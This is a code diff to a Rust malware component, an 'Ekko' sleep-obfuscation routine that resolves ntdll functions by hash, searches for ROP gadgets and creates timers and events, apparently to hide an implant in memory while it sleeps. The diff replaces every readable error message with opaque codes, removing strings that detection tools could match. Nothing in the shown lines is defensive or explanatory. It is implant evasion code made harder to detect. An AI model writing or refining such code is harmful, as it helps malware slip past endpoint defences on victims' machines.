@@ -341,32 +341,32 @@ const EKKO_MAGIC: u32 = 0x0ECC0;
 #[cfg(target_arch = "x86_64")]
 pub unsafe fn ekko_sleep(duration_ms: u32) -> Result<(), &'static str> {
     // 1. Get ntdll
-    let ntdll = get_module_by_hash(HASH_NTDLL).ok_or("No ntdll")?;
+    let ntdll = get_module_by_hash(HASH_NTDLL).ok_or("E50")?;
     
     // 2. Resolve APIs
     let fn_capture: FnRtlCaptureContext = mem::transmute(
-        get_export_by_hash(ntdll, HASH_RTLCAPTURECONTEXT).ok_or("No RtlCaptureContext")?
+        get_export_by_hash(ntdll, HASH_RTLCAPTURECONTEXT).ok_or("E51")?
     );
-    let fn_continue_addr = get_export_by_hash(ntdll, HASH_NTCONTINUE).ok_or("No NtContinue")? as u64;
-    let fn_protect_addr = get_export_by_hash(ntdll, HASH_NTPROTECTVIRTUALMEMORY).ok_or("No NtProtect")? as u64;
-    let fn_wait_addr = get_export_by_hash(ntdll, HASH_NTWAITFORSINGLEOBJECT).ok_or("No NtWait")? as u64;
+    let fn_continue_addr = get_export_by_hash(ntdll, HASH_NTCONTINUE).ok_or("E52")? as u64;
+    let fn_protect_addr = get_export_by_hash(ntdll, HASH_NTPROTECTVIRTUALMEMORY).ok_or("E53")? as u64;
+    let fn_wait_addr = get_export_by_hash(ntdll, HASH_NTWAITFORSINGLEOBJECT).ok_or("E54")? as u64;
     
     let fn_create_timer: FnNtCreateTimer = mem::transmute(
-        get_export_by_hash(ntdll, HASH_NTCREATETIMER).ok_or("No NtCreateTimer")?
+        get_export_by_hash(ntdll, HASH_NTCREATETIMER).ok_or("E55")?
     );
     let fn_set_timer: FnNtSetTimer = mem::transmute(
-        get_export_by_hash(ntdll, HASH_NTSETTIMER).ok_or("No NtSetTimer")?
+        get_export_by_hash(ntdll, HASH_NTSETTIMER).ok_or("E56")?
     );
     let fn_create_event: FnNtCreateEvent = mem::transmute(
-        get_export_by_hash(ntdll, HASH_NTCREATEEVENT).ok_or("No NtCreateEvent")?
+        get_export_by_hash(ntdll, HASH_NTCREATEEVENT).ok_or("E57")?
     );
     let fn_wait: FnNtWaitForSingleObject = mem::transmute(fn_wait_addr as *const c_void);
     let fn_close: FnNtClose = mem::transmute(
-        get_export_by_hash(ntdll, HASH_NTCLOSE).ok_or("No NtClose")?
+        get_export_by_hash(ntdll, HASH_NTCLOSE).ok_or("E58")?
     );
     
     // 3. Find ROP gadgets
-    let g = find_rop_gadgets(ntdll).ok_or("No gadgets")?;
+    let g = find_rop_gadgets(ntdll).ok_or("E59")?;
     
     // 4. Get data sections
     let sections = get_data_sections();
@@ -387,7 +387,7 @@ pub unsafe fn ekko_sleep(duration_ms: u32) -> Result<(), &'static str> {
     fn_create_timer(&mut timer, TIMER_ALL_ACCESS, ptr::null(), 1);
     fn_create_event(&mut event, EVENT_ALL_ACCESS, ptr::null(), 0, 0);
     if timer.is_null() || event.is_null() {
-        return Err("Failed to create timer/event");
+        return Err("E60");
     }
     
     // 6. Allocate EkkoData on heap
